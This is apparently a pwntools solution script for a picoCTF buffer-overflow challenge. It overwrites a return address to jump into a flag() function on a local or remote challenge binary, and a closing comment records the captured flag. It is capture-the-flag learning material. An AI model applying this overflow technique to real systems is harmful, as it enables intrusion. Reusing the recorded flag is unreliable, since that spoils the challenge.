from pwn import *

def main():
    LOCAL = True
    if LOCAL == True:
        p = process('./vuln')
    else:
        p = remote('saturn.picoctf.net', 54569)

    # Jumped to the first/second instruction inside of the flag() function because the first instruction is endbr64 which stands for end branch 64 bit.
    # Because we are specifying the exact address of the function, maybe we cannot use the endbr64 instruction? Indirect branching is used for jump tables; this means that if we are using the endbr64 instruction we have to use a jump table?
    # But that wouldn't really make sense because vuln() also uses endbr64 and when it is called from main, it doesn't go through a jump table
    # Yea i'm not sure about this

    payload = b"A" * 0x40 + b"B" * 8 + p64(0x000000000040123b)
    f = open('./temp', 'wb')
    f.write(payload)
    f.close()
    print("Payload: ", payload)
    l = p.recvuntil(b'flag:')
    print(l)
    p.sendline(payload)
    l = p.recvline()
    print(l)

    l = p.recvline()
    print(l)
    p.interactive()


    f = open('./temp', 'wb')
    f.write(payload)
    f.close()

    # Flag: picoCTF{b1663r_15_b3773r_964d9987}



if __name__ == '__main__':
    main()
